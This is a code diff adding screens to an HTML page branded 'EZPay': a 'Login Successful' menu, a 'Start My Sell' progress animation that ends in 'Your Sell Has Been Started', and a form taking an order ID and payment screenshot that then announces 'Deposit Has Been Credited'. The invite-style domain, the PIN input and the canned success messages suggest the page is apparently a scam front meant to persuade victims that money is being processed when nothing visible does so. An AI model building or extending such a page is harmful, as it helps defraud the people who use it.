@@ -24,10 +24,13 @@
             display: none;
         }
         
-        .page-0, .page-1, .page-2 {
+        .page-0, .page-1, .page-2, .page-3, .page-4, .page-5 {
             min-height: 100vh;
             background: #fff;
         }
+        .page-3 { display: none; }
+        .page-4 { display: none; }
+        .page-5 { display: none; }
         
         #pin-input {
             letter-spacing: 8px;
@@ -366,6 +369,173 @@
                             <i data-v-0cbbefe4=""></i>
                             <i data-v-0cbbefe4=""></i>
                         </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 3: SUCCESS WITH TWO BUTTONS -->
+    <div id="success-page" class="page-3">
+        <div data-v-0cbbefe4="">
+            <div data-v-0cbbefe4="" class="register-container">
+                <div data-v-0cbbefe4="" style="text-align: center; margin-top: 40px;">
+                    <img data-v-0cbbefe4="" src="https://invite.ezpayinvite1.com/img/EZPay.81ec8ad5.png" style="width: 24%;">
+                    <p data-v-0cbbefe4="" style="margin-top: 18px;">Safe, simple and efficient</p>
+                </div>
+
+                <div style="text-align: center; margin-top: 50px;">
+                    <div style="width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(135deg, #00c853, #00e676); margin: 0 auto; display: flex; align-items: center; justify-content: center;">
+                        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                    </div>
+                    <h2 style="margin-top: 20px; font-family: 'Source Sans Variable'; color: #333; font-size: 22px;">Login Successful!</h2>
+                    <p style="color: #888; font-size: 14px; margin-top: 8px;">Choose an action to continue</p>
+                </div>
+
+                <button id="start-sell-button"
+                        data-v-0cbbefe4=""
+                        class="van-button van-button--default van-button--normal van-button--block"
+                        style="margin-top: 40px; height: 48px; font-family: 'Source Sans Variable'; font-weight: bold; font-size: 20px; border-radius: 12px; color: white; background: rgb(42, 40, 255); border-color: rgb(42, 40, 255);">
+                    <div data-v-0cbbefe4="" class="van-button__content">
+                        <span data-v-0cbbefe4="" class="van-button__text">Start My Sell</span>
+                    </div>
+                </button>
+
+                <button id="get-deposit-button"
+                        data-v-0cbbefe4=""
+                        class="van-button van-button--default van-button--normal van-button--block"
+                        style="margin-top: 16px; height: 48px; font-family: 'Source Sans Variable'; font-weight: bold; font-size: 20px; border-radius: 12px; color: white; background: rgb(42, 40, 255); border-color: rgb(42, 40, 255);">
+                    <div data-v-0cbbefe4="" class="van-button__content">
+                        <span data-v-0cbbefe4="" class="van-button__text">Get My Deposit</span>
+                    </div>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 4: START MY SELL (Progress Animation) -->
+    <div id="sell-page" class="page-4">
+        <div data-v-0cbbefe4="">
+            <div data-v-0cbbefe4="" class="register-container">
+                <div data-v-0cbbefe4="" style="text-align: center; margin-top: 40px;">
+                    <img data-v-0cbbefe4="" src="https://invite.ezpayinvite1.com/img/EZPay.81ec8ad5.png" style="width: 24%;">
+                    <p data-v-0cbbefe4="" style="margin-top: 18px;">Safe, simple and efficient</p>
+                </div>
+
+                <div id="sell-progress-section" style="text-align: center; margin-top: 60px;">
+                    <div style="position: relative; width: 140px; height: 140px; margin: 0 auto;">
+                        <svg width="140" height="140" viewBox="0 0 140 140">
+                            <circle cx="70" cy="70" r="60" stroke="#e8e8e8" stroke-width="10" fill="none"/>
+                            <circle id="progress-circle" cx="70" cy="70" r="60" stroke="rgb(42, 40, 255)" stroke-width="10" fill="none"
+                                    stroke-dasharray="377" stroke-dashoffset="377" stroke-linecap="round"
+                                    transform="rotate(-90 70 70)" style="transition: stroke-dashoffset 0.1s linear;"/>
+                        </svg>
+                        <div id="progress-text" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 32px; font-weight: bold; color: rgb(42, 40, 255); font-family: 'Source Sans Variable';">0%</div>
+                    </div>
+                    <p style="margin-top: 20px; color: #888; font-size: 14px;">Processing your sell request...</p>
+                </div>
+
+                <div id="sell-success-section" style="text-align: center; margin-top: 60px; display: none;">
+                    <div style="width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(135deg, #00c853, #00e676); margin: 0 auto; display: flex; align-items: center; justify-content: center;">
+                        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                    </div>
+                    <h2 style="margin-top: 24px; font-family: 'Source Sans Variable'; color: #333; font-size: 24px; font-weight: bold;">Your Sell Has Been Started</h2>
+                    <p style="color: #888; font-size: 14px; margin-top: 10px;">Your sell order is now active and running</p>
+                    <button id="sell-back-button"
+                            data-v-0cbbefe4=""
+                            class="van-button van-button--default van-button--normal van-button--block"
+                            style="margin-top: 40px; height: 48px; font-family: 'Source Sans Variable'; font-weight: bold; font-size: 18px; border-radius: 12px; color: white; background: rgb(42, 40, 255); border-color: rgb(42, 40, 255);">
+                        <div data-v-0cbbefe4="" class="van-button__content">
+                            <span data-v-0cbbefe4="" class="van-button__text">Back to Menu</span>
+                        </div>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE 5: GET MY DEPOSIT (Order ID + Screenshot) -->
+    <div id="deposit-page" class="page-5">
+        <div data-v-0cbbefe4="">
+            <div data-v-0cbbefe4="" class="register-container">
+                <div data-v-0cbbefe4="" style="text-align: center; margin-top: 40px;">
+                    <img data-v-0cbbefe4="" src="https://invite.ezpayinvite1.com/img/EZPay.81ec8ad5.png" style="width: 24%;">
+                    <p data-v-0cbbefe4="" style="margin-top: 18px;">Safe, simple and efficient</p>
+                </div>
+
+                <div id="deposit-form-section">
+                    <div data-v-0cbbefe4="" class="content" style="margin-top: 40px;">
+                        <div data-v-0cbbefe4="" class="box">
+                            <p data-v-0cbbefe4="" class="zi">ORDER ID</p>
+                            <div data-v-0cbbefe4="" class="put">
+                                <div data-v-0cbbefe4="" class="van-cell van-field">
+                                    <div class="van-cell__value van-cell__value--alone van-field__value">
+                                        <div class="van-field__body">
+                                            <input type="text"
+                                                   id="order-id-input"
+                                                   placeholder="Enter your order ID"
+                                                   class="van-field__control">
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div data-v-0cbbefe4="" class="box" style="margin-top: 20px;">
+                            <p data-v-0cbbefe4="" class="zi">SCREENSHOT OF PAYMENT</p>
+                            <div style="margin-top: 10px;">
+                                <label id="upload-label" style="display: flex; align-items: center; justify-content: center; width: 100%; height: 120px; border: 2px dashed #ccc; border-radius: 12px; cursor: pointer; background: #fafafa; transition: all 0.3s;">
+                                    <div id="upload-placeholder" style="text-align: center;">
+                                        <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#aaa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                                        <p style="color: #aaa; font-size: 13px; margin-top: 6px;">Tap to upload screenshot</p>
+                                    </div>
+                                    <img id="upload-preview" style="display: none; max-width: 100%; max-height: 110px; border-radius: 8px;" />
+                                    <input type="file" id="screenshot-input" accept="image/*" style="display: none;">
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button id="submit-deposit-button"
+                            data-v-0cbbefe4=""
+                            class="van-button van-button--default van-button--normal van-button--disabled van-button--block"
+                            style="margin-top: 40px; height: 48px; font-family: 'Source Sans Variable'; font-weight: bold; font-size: 20px; border-radius: 12px; color: white; background: rgb(42, 40, 255); border-color: rgb(42, 40, 255);"
+                            disabled>
+                        <div data-v-0cbbefe4="" class="van-button__content">
+                            <span data-v-0cbbefe4="" class="van-button__text">SUBMIT</span>
+                        </div>
+                    </button>
+
+                    <p data-v-0cbbefe4="" style="margin-top: 24px; text-align: center;">
+                        <a href="#" id="deposit-back-link" style="color: rgb(42, 40, 255); text-decoration: none; font-family: 'Source Sans Variable'; font-weight: 400;">Back to Menu</a>
+                    </p>
+                </div>
+
+                <div id="deposit-success-section" style="text-align: center; margin-top: 60px; display: none;">
+                    <div style="width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(135deg, #00c853, #00e676); margin: 0 auto; display: flex; align-items: center; justify-content: center;">
+                        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                    </div>
+                    <h2 style="margin-top: 24px; font-family: 'Source Sans Variable'; color: #333; font-size: 24px; font-weight: bold;">Deposit Has Been Credited</h2>
+                    <p style="color: #888; font-size: 14px; margin-top: 10px;">Your deposit has been successfully processed</p>
+                    <button id="deposit-done-button"
+                            data-v-0cbbefe4=""
+                            class="van-button van-button--default van-button--normal van-button--block"
+                            style="margin-top: 40px; height: 48px; font-family: 'Source Sans Variable'; font-weight: bold; font-size: 18px; border-radius: 12px; color: white; background: rgb(42, 40, 255); border-color: rgb(42, 40, 255);">
+                        <div data-v-0cbbefe4="" class="van-button__content">
+                            <span data-v-0cbbefe4="" class="van-button__text">Back to Menu</span>
+                        </div>
+                    </button>
+                </div>
+
+                <div data-v-0cbbefe4="" class="van-overlay" id="loading-overlay-5" style="display: none;">
+                    <div data-v-0cbbefe4="" class="wrapper">
+                        <div data-v-0cbbefe4="" class="van-loading van-loading--spinner">
+                            <span data-v-0cbbefe4="" class="van-loading__spinner van-loading__spinner--spinner" style="color: rgb(25, 137, 250);">
+                                <i data-v-0cbbefe4=""></i><i data-v-0cbbefe4=""></i><i data-v-0cbbefe4=""></i><i data-v-0cbbefe4=""></i>
+                                <i data-v-0cbbefe4=""></i><i data-v-0cbbefe4=""></i><i data-v-0cbbefe4=""></i><i data-v-0cbbefe4=""></i>
+                                <i data-v-0cbbefe4=""></i><i data-v-0cbbefe4=""></i><i data-v-0cbbefe4=""></i><i data-v-0cbbefe4=""></i>
+                            </span>
+                        </div>
                     </div>
                 </div>
             </div>
